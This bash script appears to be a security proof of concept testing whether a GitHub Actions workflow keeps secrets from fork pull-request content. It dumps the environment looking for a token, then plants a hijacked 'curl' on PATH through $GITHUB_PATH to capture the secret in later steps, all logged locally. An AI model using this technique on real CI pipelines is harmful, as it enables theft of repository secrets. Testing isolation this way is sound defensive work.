#!/bin/bash
# This file is PR-controlled content, played by an external contributor's
# fork for the qli-ci#39 POC. It runs inside poc-check.yml's "Process PR
# content (no secret in scope)" step, i.e. AFTER the trusted workflow_run
# stage has taken over but BEFORE the later step that has the secret in env.
#
# It tries two things:
#   1. Dump this step's own env, in case the secret is (wrongly) already
#      visible here.
#   2. Plant a fake `curl` earlier on PATH (via $GITHUB_PATH, which persists
#      for the rest of the job) so that if a LATER step in the same job calls
#      curl while the secret is in its env, this shim captures it instead of
#      hitting the real network.
#
# Nothing here is sent anywhere external; everything is written to local
# files under $RUNNER_TEMP so the investigator can pull them back as
# workflow artifacts.

set -u

echo "attack.sh running as: $(id)"
echo "PWD: $(pwd)"

mkdir -p "${RUNNER_TEMP}/evil-bin"

echo "--- attempt 1: direct env dump ---"
env | grep POC_FORK_PR_TEST_TOKEN > "${RUNNER_TEMP}/env-dump.txt" || echo "secret not found in env (expected if isolation holds)"

echo "--- attempt 2: PATH-hijacked curl for later steps ---"
cat > "${RUNNER_TEMP}/evil-bin/curl" <<'EOF'
#!/bin/bash
{
  echo "=== hijacked curl invoked by a LATER step ==="
  echo "args: $*"
  echo "POC_FORK_PR_TEST_TOKEN=${POC_FORK_PR_TEST_TOKEN:-<unset in this step's env>}"
} >> "${RUNNER_TEMP}/curl-capture.txt"
exit 0
EOF
chmod +x "${RUNNER_TEMP}/evil-bin/curl"
echo "${RUNNER_TEMP}/evil-bin" >> "$GITHUB_PATH"

echo "attack.sh done"
